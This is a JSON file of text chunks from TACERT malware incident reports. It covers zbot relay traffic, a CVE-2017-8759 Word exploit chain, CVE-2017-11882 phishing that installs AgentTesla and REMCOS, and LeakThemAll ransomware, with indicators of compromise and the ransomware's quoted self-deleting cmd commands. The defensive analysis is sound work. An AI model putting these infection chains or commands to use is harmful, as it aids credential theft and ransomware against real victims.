    "413": {
        "File_Name": "個案分析-惡意程式m_exe分析報告_10207.pdf",
        "content": "紀錄中發現下一層至少有734 個中繼站,研 判至少為三階層的網路架構,本主機為於第二層的中繼站。 (2).測試VM 主機會使用Fast-Flux 技術變換許多網域名稱讓其他zbot 主機連入,紀錄中約有200 個網域名稱會對應至此測試VM 主機 140.xx.xx.60。 (3).主要連結下一層的中繼站有6 個,依傳輸排名為193.105.134.89、 78.83.177.242、78.83.177.250、193.105.134.189、89.45.14.47、 89.45.14.49。 (4).這些IP 皆為國外的中繼站,並已被McAfee SiteAdvisor 及 Virustotal 確定列為惡意網站。 (5).此惡意程式會向這些中繼站的Port 80 做HTTP 中繼htm、php、exe 檔,並透過分析發現htm 和php 不是合法的檔案標頭,其內容都是 編碼過的資料且無法解碼。 (6).其中pcap 截錄出的htm 和php 檔共10,141 個,解析其內容皆為加 密過的亂碼,故無法得知zbot 所傳送檔案資訊。 圖7、測試VM 主機pcap 截錄出的部分檔案 (7).其中pcap 截錄出exe 檔共1,255 個,都是惡意程式,大多命名為 m.exe、calc.exe 或其他隨機命名的exe 檔案。而m.exe 即為此案  6 的惡意程式,且檔案Logo 不是唯一樣式。 圖8、測試VM 主機pcap 截錄出的惡意執行檔 8. 作為垃圾郵件中繼站(Mail Relay),利用TCP port 80 負責接收上一層 zbot 主機發送的垃圾郵件或惡意郵件,並轉送給許多受害者,誘使收 件者開啟惡意郵件或連結。 (1).此中繼站接收到的Email 位址約有435 個,來源端有3 個國家、9 個IP 位址,依排名為Germany、Netherlands、France。 (2)",
        "Page_Num": "5,6"
    },
    "414": {
        "File_Name": "個案分析-惡意程式m_exe分析報告_10207.pdf",
        "content": ".此中繼站發送出的Email 位址約有435 個,目的地有38 個國家、 121 個IP 位址。 (3).來源端與目的地的Email 位址個數一樣是因為只做Mail Relay 的 緣故,而非主機自己產生郵件。 (4). 以下為部分重建的取樣郵件,內文都有惡意網站連結。 圖9、測試VM 主機pcap 截錄出的惡意郵件  7 9. NETBIOS:測試VM 主機對許多IP 做UDP Port 137 的Name query NBSTAT, 目標總數約有11,311 次且國別數有132 個,截錄的檔案為無法辨識的 raw 檔。 圖10、測試VM 主機pcap 截錄看到netbios 疑似scan 非特定網段IP 五、Google Earth 整合: 1. 觀察測試VM 主機所連入的Zbots 主要分布於全世界各地,以歐洲和日 本較為密集。 (1).中國的點很少,推測可能是中國駭客利用他國IP 所為。 圖11、測試VM 主機所連入的Zbots 分布,綠點為zbots。 2. 觀察測試VM 主機所連出的中繼站主要分布在歐洲、北美洲和日本,特 別是瑞典和保加利亞為大宗。紅色線表示此IP 的Session 數量極多。 (1).中國的點很少,推測可能是中國駭客利用他國IP 所為。  8 圖12、測試VM 主機所連出的中繼站分布。 建議措施 1. 此惡意程式容易夾帶於郵件連結或各式附檔(doc,pdf,xls,...)中,應避 免直接開啟。 2. 檢查主機帳密是否安全,遠端桌面連線非必要可關閉。 3. 感染惡意程式主機會被當作中繼站跳板,同時也會將自己的個人資料外 洩。 4. 來路不明的檔案不要輕易開啟,可以先透過Virustotal 進行線上掃 描。 5. 時常用網路流量監看工具(netstat, tcpview, ...)是否有異常流量及 Port 被啟用,以便找出可疑的執行程式。 6. 可用程序監",
        "Page_Num": "6,7,8"
    },
    "415": {
        "File_Name": "個案分析-惡意程式m_exe分析報告_10207.pdf",
        "content": "看工具(procexp)將該異常程式移除,可用登錄機碼工具 (autoruns)檢查開機自動執行的登錄碼有無異常。 7. 線上檢測惡意網站: (1).https://www.virustotal.com/en/ (2).http://sitecheck.sucuri.net (3).http://www.siteadvisor.com ",
        "Page_Num": "8"
    },
    "416": {
        "File_Name": "個案分析-憑藉.NET Framework漏洞散播惡意Word檔病毒事件分析報告_10610.pdf",
        "content": "個案分析- 利用.NET Framework 漏洞 散播惡意Word 檔病毒事件 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年10 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 微軟的Office 系列軟體是許多電腦系統內普遍被使用的必安裝軟體,其中 以Word 軟體使用率最高。 2. 本資安事件為使用者無意間開啟一個有CVE2017-8759 漏洞的Word 檔,造成 下載惡意程式的事件。 3. 惡意程式為一個名為「Doc1.doc」的 Word 文件檔案,此檔案看起來很普通, 為一般使用者常用的word 檔,容易造成使用者開啟它。 4. 通常這一類檔案多會依附在 SPAM 垃圾郵件或 APT 郵件中,誘使一般人開 啟,並遭受感染。 5. 本中心測試網路上取得的惡意程式樣本,並觀察其系統及網路行為,分析可 能對於電腦主機受到的損害。 II. 事件檢測 1. 本中心透過使用 Win7(x64)系統的 VM 主機進行隔離測試,首先將病毒樣本 解壓縮後放於下載資料夾中。 2. 開啟Doc1.doc 檔後,發現會開啟程式小畫家。 3. 從Process Monitor 檢視,發現開啟Doc1.doc 後,程式WINWORD.EXE 會呼叫 程式csc.exe 與mshta.exe,而csc.exe 會呼叫程式cvtres.exe。其中程式 csc.exe 會編譯代碼生成一個名字像http[url path].dll 的檔案,然後微軟 的Office 會載入這個檔案,完成漏洞利用。mshta.exe 會從同一個伺服器接 收一個叫做“cmd.hta”的HTA 腳本。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 將Doc1.doc 送至Virustotal 網站檢測,被偵測出為惡意程式的比例為 30/58,仍有28 家防毒公司的軟體無法檢測出它。有多家防毒公司對此程式 命名",
        "Page_Num": "1,2,3"
    },
    "417": {
        "File_Name": "個案分析-憑藉.NET Framework漏洞散播惡意Word檔病毒事件分析報告_10610.pdf",
        "content": "使用到「CVE-2017-8759」的用字,可見此檔案被視為一個含有CVE 漏洞 的檔案。 5. 在Virustotal 網站分析內容與檢視Doc1.doc 內容,發現開啟Doc1.doc 檔案 時,會同時自動開啟exploit.txt 檔。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 檢視exploit.txt 內容,發現該XML 檔案被自動開啟時,會有綁定一個SOAP 網址,它會執行mshta.exe 連至該網址來下載執行cmd.hta。 7. 檢視cmd.hta 內容,發現它會呼叫程式powershell 去執行cmd.exe,再由 cmd.exe 呼叫mspaint.exe(小畫家)。 8. 檢視背景程式內容,發現開啟Doc1.doc 後會陸續呼叫下列執行檔 Wininit.exe、service.exe、svchost.exe、WmiPrvSE.exe、powershell.exe、  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team cmd.exe 與mspaint.exe(小畫家),從此處可以發現cmd.hta(VB 腳本)被確實 執行。 9. 檢視Doc1.doc 所在資料夾,發現在開啟Doc1.doc 後會產生3 個檔案,分別 是http100localhost180800exploit4txt.dll、 http100localhost180800exploit4txt.pdb 與Logo.cs。 10. 將程式http100localhost180800exploit4txt.dll 送至VirusTotal 網站檢 測,檢測其為惡意程式比例為4/65,被防毒軟體檢測出此漏洞的機率很低。 11. 檢視程式http100localhost180800exploit4txt.dll 內容,發現它會執行程 式mshta.exe 與cmd.hta。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 檢視Logo.cs 內容,可看到解析exploit.txt 為C#代碼後的內容。 III. 網路架構圖  6 臺灣",
        "Page_Num": "3,4,5,6,7"
    },
    "418": {
        "File_Name": "個案分析-憑藉.NET Framework漏洞散播惡意Word檔病毒事件分析報告_10610.pdf",
        "content": "學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 駭客透過社交工程方式將惡意Word 檔寄給受害者。 2. 受害者開啟惡意Word 檔。 3. 自動開啟http://localhost/exploit.txt(WSDL 文檔)。 4. .NET Framework 解析exploit.txt 為C#代碼(.cs 原始程式碼)。 5. csc.exe 編譯C#代碼為http[url path].dll。 6. Word 載入http[url path].dll 執行mshta.execmd.hta。 7. cmd.hta 呼叫powershell.execmd.exe mspaint.exe(小畫家)。 IV. 建議與總結 1. CVE-2017-8759 為2017 年9 月被發現的.NET Framework 漏洞,駭客可通 過惡意的RTF(Word)文檔利用該漏洞來傳播病毒,因WSDL 解析器代碼注 入漏洞,在解析SOAP WSDL 定義的內容中它允許駭客注入任意代碼,並利 用它下載和執行一個包含PowerShell 命令的VB 腳本。 2. 目前該漏洞的概念性驗證PoC ( Proof of Concepts )已經在網路上傳播, 它可以搭配惡意程式,例如將小畫家置換成竊聽軟體FINSPY,透過使用 者常用的Word 檔去開啟它,可見其為高危險的漏洞。 3. 由於.NET Framework 安裝非常廣泛,而該漏洞影響到幾乎所有舊版本 的.NET Framework,若駭客有心利用將會爆發新一輪的大規模漏洞攻擊。 4. 預防措施: (1)修補.NET Framework 漏洞: 修補程式下載地址如下。 https://portal.msrc.microsoft.com/zh-tw/security-guidance/advi sory/CVE-2017-8759 (2)不要打開不明來源的Office 文檔(.rtf、.doc)。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team V. 相關報導 FireEye Uncovers CVE-2017-8759: Zero-Day Used in the Wild to Distribute FINSPY https://www.fireeye.com/blog",
        "Page_Num": "7,8"
    },
    "419": {
        "File_Name": "個案分析-憑藉.NET Framework漏洞散播惡意Word檔病毒事件分析報告_10610.pdf",
        "content": "/threat-research/2017/09/zero-day-used-to-distribute -finspy.html ",
        "Page_Num": "8"
    },
    "420": {
        "File_Name": "個案分析-應用CVE漏洞的社交工程事件分析報告.pdf",
        "content": "TLP:WHITE 應用CVE 漏洞的 社交工程事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2024 年02 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. CVE-2017-11882 漏洞(CVSS 評分:7.8)是 Microsoft Office 方程式編輯器 中的 RCE 漏洞,與處理 RAM 中的物件失敗有關。要利用這個漏洞,攻擊 者必需建立一個惡意檔案,然後說服受害者打開它,通常是透過電子郵件或 被入侵的網站發送。 2. 成功利用漏洞後,會導致方程式編輯器(EQNEDT32.EXE)處理程序發生了 記憶體中斷的現象,使得攻擊者能透過處理程序挖空手法,擁有打開惡意檔 案的使用者的權限去執行任意代碼。如果使用者持有管理員權限,攻擊者更 可以完全控制系統,包括安裝程式、檢視、修改或破壞資料,甚至是建立新 帳戶。 3. CVE-2017-11882 漏洞自2017 年被揭露後,在2018 年成為Microsoft Office 最經常被利用的安全漏洞。它陸續被駭客應用至今,而這期間駭客利用該漏 洞進行的攻擊手法變化萬千。整理近幾年與該漏洞有關的資安事件(如下), 發現該漏洞利用可以散播間諜軟體或竊密軟體感染受害主機,進而竊取憑證 與個人資料。 (1)2017/12/10 惡意RTF 檔案利用漏洞CVE-2017-11882 來散播間諜軟體Loki。 (2)2022/5/23 駭客以電子郵件寄送一個PDF 文件,於文件中嵌入惡意的Word 檔案,並開採微軟的Office 漏洞CVE-2017-11882,以於受害者系統上安裝鍵 盤側錄工具Snake Keylogger。 (3)2023/09/07 惡意程式Agent Tesla 透過5 年前Office 漏洞:CVE-2017-11882、 CVE-2018-0802 發動攻擊。 (4)2023/12/21 駭客利用CVE-2017-11882 作為網路釣魚活動的一部分來散播 Agent Tesla。 4. 在2024 年1 月底,TACERT 服務信箱陸續",
        "Page_Num": "1,2"
    },
    "421": {
        "File_Name": "個案分析-應用CVE漏洞的社交工程事件分析報告.pdf",
        "content": "收到兩封含有附件而且主旨類似的 信件,為了解兩封信對於收件者的危害程度,故對信件進行檢測。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1) 信件1 –寄件者:Lei Huang ,主旨:PI 缺失,於2024/01/26 下午12:22 收 到。 (2) 信件2 –寄件者:Ricky Chiou, 主旨:新PI,於2024/01/31 下午1:32 收到。 二、 事件檢測 1. 打開信件1 後,發現寄件者Lei Huang 偽裝成臺灣某模具製造公司的銷售部 門寄出信件。由收件者undisclosed-recipients 可知道信件1 以密件副本寄出, 收件者無法知道該信件還寄給哪些人。檢視信件1 的郵件內容以繁體中文撰 寫,內容為一般銷售過程中客戶詢問付款帳戶的資訊,收件者若為公司業務 人員將不會覺得有異常。 2. 檢視信件1 的Mail Header ,發現該信件從德國IP:78.46.61.231 伺服器寄出。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 打開附件INV376267839.doc (MD5:95E1D42FACA462FEB431AD62F2BF1C3D),發現內容有10 頁。除了 英文文章外,還有兩段不同類型的亂碼。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 檢視主機對外網路連線,發現EQNEDT32.EXE 在打開信件附件後對外連線 美國IP: 104.21.21.189 之443port。 5. 檢視主機背景程式的運作,發現EQNEDT32.EXE 為方程式編輯器,這是微 軟Office 用來在文件中插入或編輯OLE 物件的工具。 6. 檢視主機連線美國IP:104.21.21.189 之封包,得知美國IP 所對應的主機網址 為「amassmodel.top」,而傳輸內容因為加密呈現亂碼。  5 臺灣",
        "Page_Num": "2,3,4,5,6"
    },
    "422": {
        "File_Name": "個案分析-應用CVE漏洞的社交工程事件分析報告.pdf",
        "content": "學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1) 該美國IP 經Virustotal 檢測為 0/90。 (2) 網址「amassmodel.top」經Virustotal 檢測為20/92,為惡意網址。 (3) 此網址在2024 年1 月底被用來散播AgentTesla。 7. 信件1 附件INV376267839.doc 經Virustotal 檢測,其惡意比例為34/59。防毒 軟體公司判定該附件與三個微軟office 漏洞利用有關(如下表),這三個漏洞是 由於物件在記憶體中的處理方式,導致Microsoft Office 的方程式編輯器存在 遠端程式碼執行漏洞,也稱為「Microsoft Office 記憶體損壞漏洞」。 漏洞編號 防毒軟體以漏洞編號命名之數量 CVE-2017-11882 4 CVE-2018-0798 3 CVE-2018-0802 3 其中有 4 家防毒軟體判定其利用CVE-2017-11882 漏洞,並以該漏洞編號命名 此附件的惡意軟體名稱。 8. 打開信件2 後,發現寄件者Ricky Chiou 偽裝成臺灣某鋼管公司的聯絡信箱代 表人員寄出信件,而其於信件中所告知的聯絡資訊與該公司該位人員相同。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 由收件者undisclosed-recipients 可知道信件2 以密件副本寄出,收件者無法知 道該信件還寄給哪些人。檢視信件2 的郵件內容以繁體中文撰寫,內容為與 客戶確認產品規格的資訊,收件者若為負責處理採購業務的人員將不會覺得 有異常。 9. 檢視信件2 的Mail Header ,發現該信件從芬蘭IP:95.216.246.225 伺服器寄 出。該芬蘭IP 在AbuseIPdb 上被檢舉4 次,而被濫用的可信度為 18%。其 最近一次被檢舉是在2024/02/01 因為網路釣魚與垃圾郵件被舉報。 10. 彙整信件1 與信件2 的檢測結果如下表,",
        "Page_Num": "6,7"
    },
    "423": {
        "File_Name": "個案分析-應用CVE漏洞的社交工程事件分析報告.pdf",
        "content": "發現其攻擊手法相似。 項目 信件1 信件 2 寄件者郵件 德國IP:78.46.61.231 芬蘭IP:95.216.246.225  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 項目 信件1 信件 2 伺服器IP (在AbuseIPdb 被舉報為惡意IP) 信件附件 INV376267839.doc (1)Virustotal:34/59 (2)漏洞利用: CVE-2017-11882、 CVE-2018-0798、 CVE-2018-0802 PI00232.doc (內容與信件1 附件 相似) (1)Virustotal:37/60 (2)漏洞利用:CVE-2017-11882、 CVE-2018-0798、CVE-2018-0802 啟動的程式 Eqnedt32.exe Eqnedt32.exe (方程式編輯器) 對外連線IP 美國IP:104.21.21.189:443, (1)其對應網址為 「amassmodel.top」。 (2)該網址經Virustotal 檢測 為20/92,為惡意網址。 (3)此網址在2024/1 月底被 用來散播AgentTesla。 美國IP:172.67.183.155:443 (1)在AbuseIPdb 被舉報為惡意 IP,最近一次被檢舉是在 2023/11/01 因為暴力攻擊被舉報。 (2)該IP 經Virustotal 檢測為惡意 IP,而且為Lokibot 的C2 server。 (3)其對應網址為 「blueyonderllc.top」。 (4)該網址經Virustotal 檢測為 21/92,為惡意網址。 (5)此網址在2024/2/1 被用來散播 AgentTesla。 下載的檔案 plug30056.exe Plugman39506.exe 三、 事件攻擊行為 1. 信件1 附件INV376267839.doc 經檢測後發現其攻擊行為如下圖所示。首先, 在附件被開啟後會呼叫EQNEDT32.EXE 來執行。接著在它執行後下載可執 行檔。在EQNEDT32.EXE 啟動後開始CVE-2017-11882 的漏洞利用,並且建 立可疑的網路連線。當下載回來的可執行檔plug30056.exe",
        "Page_Num": "7,8"
    },
    "424": {
        "File_Name": "個案分析-應用CVE漏洞的社交工程事件分析報告.pdf",
        "content": "執行後,啟動植入 的REMCOS(遠端存取木馬程式)。最後,竊取個人資料、從 Web 瀏覽器竊 取憑證與使用 NirSoft 程式收集憑證並竊取憑證。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 信件2 附件PI00232.doc 經檢測後發現其攻擊行為如下圖所示。 首先,在附件被開啟後會呼叫EQNEDT32.EXE 來執行。在它執行後下載可 執行檔。之後EQNEDT32.EXE 建立可疑的網路連線,並在它啟動後開始 CVE-2017-11882 的漏洞利用。當下載回來的可執行檔plugman39506.exe 執行 後啟動AgentTesla。最後,從 Web 瀏覽器竊取憑證與竊取主機內個人資料。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、 總結與建議 1. 經檢測兩封信件後發現該類信件之攻擊行為相同。攻擊者偽裝成台灣公司的 人員寄出信件給收件者,當收件者收信並開啟惡意附件的Word 檔後,將會 觸發CVE-2017-11882 的漏洞利用。接著會執行竊密軟體,如Agent Tesla, 進而且竊取個人資料與憑證。 2. 在可能影響方面,本案的兩封信件內容很真實,容易引誘收件者開啟附件 Word 檔,造成個人資料與憑證被竊, 侵害了隱私權,因此對CIA 中的機密 性造成衝擊。 3. 關於此類攻擊的處理方式,可先使用防毒軟體對受害主機進行掃描,並移除 惡意程式,也可使用微軟Process Explorer 工具來檢視背景程式中是否有惡意 程式執行。 4. 對於此類案件的預防方式有下列兩點: (1) 由於本案的郵件攻擊手法是透過社交工程來散播惡意郵件,建議收件者 勿隨意開啟不明來源之附件。 (2) 因該類攻擊利用CVE-2017-11882 等系列相關的office 漏洞,建議使用者 定期更新Office 軟體 ,以避免遭受",
        "Page_Num": "8,9,10"
    },
    "425": {
        "File_Name": "個案分析-應用CVE漏洞的社交工程事件分析報告.pdf",
        "content": "漏洞利用的攻擊。 參考資料 1. CVE-2017-11882: five years of exploitation https://www.kaspersky.com/blog/cve-2017-11882-exploitation-on-the-rise/4876 8/ 2. 惡意程式Agent Tesla 透過5 年前Office 漏洞發動攻擊 https://www.ithome.com.tw/news/158641 3. 17 年的微軟Office 漏洞(CVE-2017-11882),仍繼續搞破壞 https://blog.trendmicro.com.tw/?p=53726  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 研究人員警告小心夾帶惡意Word 檔的PDF https://www.ithome.com.tw/news/151069 5. PHISHING ATTACKS USE AN OLD MICROSOFT OFFICE FLAW TO SPREAD AGENT TESLA MALWARE https://securityaffairs.com/156246/cyber-crime/agent-tesla-phishing-cve-2017-11 882.html#google_vignette ",
        "Page_Num": "10,11"
    },
    "426": {
        "File_Name": "個案分析-新勒索病毒Leakthemall變種.genesis病毒分析報告.pdf",
        "content": "TLP :WHITE 新勒索病毒Leakthemall 變種.genesis 病毒分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2020 年12 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 自2020/09 中旬有多間學校NAS 感染勒索病毒AgeLocker 後,在2020/10/24 發生一所高中有四台NAS 感染勒索病毒Phobos 的事件。之後,在2020/12/02 又發生Y 高中存放行政業務文件的NAS 內文件被加密之事件。 2. 從Y 高中的DHCP Server 發現有駭客入侵後建立一個帳號並且連線NAS 的 足跡,而該DHCP Server 存有管理者的帳號與密碼。 3. Y 高中的NAS 內被加密的檔案是被admin 權限所執行,而且該NAS 預設的 admin 權限是開啟的。 4. 在NAS 內沒有所有檔案都被加密,當檔案數量太多或是訪問多層次資料夾 時,則出現加密不完全的現象。推測疑似因為NAS 硬體資源有限與存放檔案 數量過多的關係,而無法一次性將NAS 內所有檔案加密。 5. Y 高中的NAS 有開放給校外連線,而且該校有將NAS 內資料夾當成網路磁 碟機使用的習慣。 6. Y 高中提供勒索通知信檔案與在NAS 內所發現的惡意程式給TACERT 進行 檢測,以利了解該勒索病毒對於受害設備進行何種攻擊行為。 二、事件檢測 1. 首先,從學校所提供的檔案可以得知該校NAS 被攻擊的事件時間點為 2020/12/2 上午12:11(凌晨12:11)。程式Genesis_en.exe 是在2020/12/2 上午 06:37 在NAS 上建立,而且該程式最後一次被修改日期為2020/11/20 下午 04:19。又該校NAS 內檔案沒有全部被加密,由此可以推測駭客可能在NAS 內執行第一次加密後發現檔案沒有全部被加密,而企圖想再次執行加密,故 再次返回將Genesis_en.exe 放入NAS 內。  2 臺灣學術網路危機處理中心(",
        "Page_Num": "1,2,3"
    },
    "427": {
        "File_Name": "個案分析-新勒索病毒Leakthemall變種.genesis病毒分析報告.pdf",
        "content": "TACERT) TANet Computer Emergency Response Team 2. 檢視!HELP!.txt 的內容,駭客告訴受害者您的檔案已被加密外,也告訴受害 者您的私人敏感資訊也被偷走了。駭客威脅受害者若不付贖金這些資料可能 被發佈在各大媒體的即時新聞中,並要求受害者立即寫信至聯絡信箱 (genesishelp@mail.ee 或genesishelp@cock.li)。在勒索通知信最後註明該受害 者的Personal ID,該Personal ID 為一組亂碼對應到一組數字: 「47352c3f62d27b248f881a2c52b94680973aee9f394983817078336d630d956b」 。 3. 檢視__lock_XXX__的內容,發現內含!HELP!.txt 內的Personal ID 資訊。 查看__lock_XXX__的屬性發現其為一個隱藏檔。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 將!HELP!.txt 與__lock_XXX__上傳至 ID Ransomware 勒索病毒識別網站 (https://id-ransomware.malwarehunterteam.com),經檢測判定為LeakThemAll, 而且該勒索病毒目前還在被研究分析中。其為新的病毒,而且尚未有解密器 產生。 5. 將genesis_en.exe 上傳至Virustotal 網站檢測,發現該勒索病毒為首次上傳。 經Virustotal 檢測其惡意比例高達45/70,而且仍有25 家防毒軟體公司的防 毒軟體無法檢測出它的存在。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 進行genesis_en.exe 的檢測,使用一台掛載網路碟機的Win 7 32 位元主機, 並且執行genesis_en.exe (MD5: 6d21c44a2377fc871ae00106e4a0a3b7)。經執行 後發現genesis_en.exe 在原地消失。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 查看!HEL",
        "Page_Num": "3,4,5,6"
    },
    "428": {
        "File_Name": "個案分析-新勒索病毒Leakthemall變種.genesis病毒分析報告.pdf",
        "content": "P!.txt 內容,發現與學校所提供的!HELP!.txt 內容相同,僅Personal ID 會隨每次執行genesis_en.exe 而不同。這個Personal ID 每次都會固定對應 到的一組相同的數字「47352c3f62d27b248f881a2c52b94680973aee9f39498381 7078336d630d956b」。 8. 在C:\\ProgramData 資料夾內發現一檔名為「47352c3f62d27b248f881a2c52b9 4680973aee9f394983817078336d630d956b」的檔案,它在genesis_en.exe 執行 後會先產生。之後該資料夾才出現!HELP!.txt。 檢視這個數字命名的檔案內容發現為Personal ID,而且該檔案在主機內僅此 一個。每次病毒執行後都會在這資料夾內產生相同檔名的檔案。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 查看檔案被加密的情形,發現所有被加密的檔案都會延伸出.genesis 的副檔 名,而且被genesis_en.exe 拜訪過的資料夾內都會產生一個!HELP!.txt。 10. 在genesis_en.exe 執行後會呼叫cmd.exe 來執行兩個指令。 (1) ping 1.1.1.1 –n 10 –w 3000 >Nul 在執行情形不呈現於主機螢幕上之情況下,ping Cloudflare 的Public DNS 主機1.1.1.1。要傳送的回應(echo)要求數目為10 ,而且每個回覆的等候  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 逾時為3000 毫秒。推測駭客此行為在確保主機是連接網路的狀態。 (2) Del /f /q “C:\\Users\\Ruby\\Downloads\\genesis_en.exe” 在系統不會提示使用者確認刪除的訊息下,強制刪除檔案genesis_en.exe。 由此可知該病毒在加密後會自我刪除本身。 11. 在genesis_en.exe 執行後,它會先在主機桌面產生!HEL",
        "Page_Num": "6,7,8"
    },
    "429": {
        "File_Name": "個案分析-新勒索病毒Leakthemall變種.genesis病毒分析報告.pdf",
        "content": "P!.txt。在加密過程中, 它會對每個拜訪過的資料夾都先產生一個暫時的隱藏檔案__lock_XXX__。之 後才產生!HELP!.txt 於資料夾內。在加密作業完成後,__lock_XXX__會消失。 12. 檢視genesis_en.exe 加密檔案的過程,如下圖可得知會先在Documents 資料夾 內產生__lock_XXX__,之後產生!HELP!.txt。最後開始加密第一個檔案 ABC.txt.genesis。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 13. 將!HELP!.txt 與一個被加密的ABC.txt.genesis 檔案上傳至 ID Ransomware 勒 索病毒識別網站,經檢測判定為LeakThemAll,而且該勒索病毒目前仍在被 研究分析中、尚未有解密器。與前面學校所提供檔案的判斷內容相同,可確 認genesis_en.exe 為此事件的勒索病毒程式。 14. 對genesis_en.exe 的程式內容進行HEX 分析,發現內含!HELP!.txt 的內容。 15. 從genesis_en.exe 程式的HEX 分析內容與實際檢測發現,該程式不會對下圖 中所列資料夾內檔案、NTUSER.DAT 與副檔名為.dll、.lib、.sys 的檔案進行 加密。例如:AnyDesk(遠端桌面連線用)疑似是駭客為方便遠端連線而保留的 資料夾。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 16. 從程式genesis_en.exe 的HEX 內容發現下圖所列的資料庫程式或資料檔案用 的副檔名,推測該程式可能會搜尋主機內是否存在這些檔案。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 經檢測發現這些副檔名的檔案是會被genesis_en.exe 加密,並沒有排除。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為示意圖 1. 駭客從校外駭入DHCP ",
        "Page_Num": "8,9,10,11,12"
    },
    "430": {
        "File_Name": "個案分析-新勒索病毒Leakthemall變種.genesis病毒分析報告.pdf",
        "content": "伺服器 。 2. 駭客在DHCP 伺服器上建立一個帳號。 3. 駭客駭入NAS 並上傳惡意程式genesis_en.exe 至NAS。 4. 執行genesis_en.exe 進行檔案加密作業。 (所拜訪的資料夾會先產生__lock_XXX__,之後產生!HELP!.txt。) 5. 呼叫cmd.exe 來執行兩個指令。 (5.1)執行ping 1.1.1.1 –n 10 –w 3000 >Nul 來確保主機是連接網路的狀態。 (5.2)執行Del /f /q “C:\\Users\\Ruby\\Downloads\\genesis_en.exe”來刪除 genesis_en.exe 本身(在系統不會提示使用者確認刪除的訊息下,強制刪除檔 案genesis_en.exe。)。 6. 呼叫ping.exe 來執行(5.1) (在執行情形不呈現於主機螢幕上之情況下,ping Cloudflare 的Public DNS 主 機1.1.1.1。)。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 由於無法完全加密NAS 內檔案,駭客再次登入NAS 並且上傳genesis_en.exe。 (因NAS 硬體資源有限,當檔案數量太多或是訪問多層次資料夾時無法一次 性加密全部檔案。) 四、總結與建議 1. 近期新發現的LeakTheMall 勒索軟體(又名LeakThemAll)是一種資料鎖 定病毒,最早是由網路安全研究員Amigo-A 發現的。 2. 它會將您的文件副檔名延伸更改為.crypt、.montana 或.beijing,而最近新 型變種的副檔名是.genesis。 3. 該變種病毒.genesis 執行後除加密檔案外,會ping Public DNS 主機1.1.1.1 來確保網路連線是開啟的狀態,並且加密作業完成後會自我刪除本身。 4. 它會固定在C:\\ProgramData 資料夾內存放固定數字檔名的Personal ID 檔 案。 5. 該病毒在加密過程中對於所拜訪的資料夾會先產生__lock_XXX__,之後 產生!HELP!.txt。 6. genesis_en.exe ",
        "Page_Num": "12,13"
    },
    "431": {
        "File_Name": "個案分析-新勒索病毒Leakthemall變種.genesis病毒分析報告.pdf",
        "content": "於NAS 上建立時間為加密時間之後,推測駭客可能因為 NAS 硬體資源有限、檔案數量太多與資料夾多層次的原因,導致無法一 次性完成加密,故想再次加密而第二次上傳程式至NAS。 7. 該病毒有預設一個排除的資料夾、NTUSER.DAT 與副檔名為.dll、.lib、.sys 等檔案類型的名單,符合名單上所列條件的檔案都不會被加密。 8. 該病毒程式內有一些資料庫程式或資料檔案用的副檔名,推測該程式可能 會搜尋主機內是否存在這些檔案。這些副檔名的檔案是會被 genesis_en.exe 加密,並沒有排除。 9. 對於此勒索病毒的預防除了平時做好資料備份外,建議在NAS 的管理上 加強下列項目:  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1.)校外連線存取需管控連線來源。 (2.)建議不要隨意開啟不明來源的檔案。 (3.)避免將NAS 內的資料夾設為主機的網路磁碟機。 (4.)定期更新NAS 的修補程式。 (5.)請勿使用原廠的預設帳戶與密碼管理NAS。 ",
        "Page_Num": "13,14"
    },
    "432": {
        "File_Name": "個案分析-新型態的加密勒索惡意程式分析報告_10504.pdf",
